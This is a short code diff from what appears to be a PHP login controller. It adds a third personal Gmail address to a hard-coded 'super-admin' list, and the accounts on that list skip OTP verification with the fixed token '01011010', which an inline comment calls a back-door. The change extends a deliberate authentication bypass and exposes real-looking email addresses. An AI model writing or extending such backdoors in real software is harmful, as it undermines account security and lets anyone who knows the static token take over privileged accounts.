@@ -39,7 +39,7 @@ use App\Services\AuditLogger;
 
             // Allow super-admin to bypass OTP if needed (e.g., using a back-door for testing)
             // Or implement a simple local fallback if Supabase fails
-            $superAdmins = ['habee2004@gmail.com', 'adminTester01@gmail.com'];
+            $superAdmins = ['habee2004@gmail.com', 'whysofunny2003@gmail.com', 'adminTester01@gmail.com'];
             $localOtp = session('local_otp');
 
             if (in_array($email, $superAdmins) && $request->token === '01011010') {
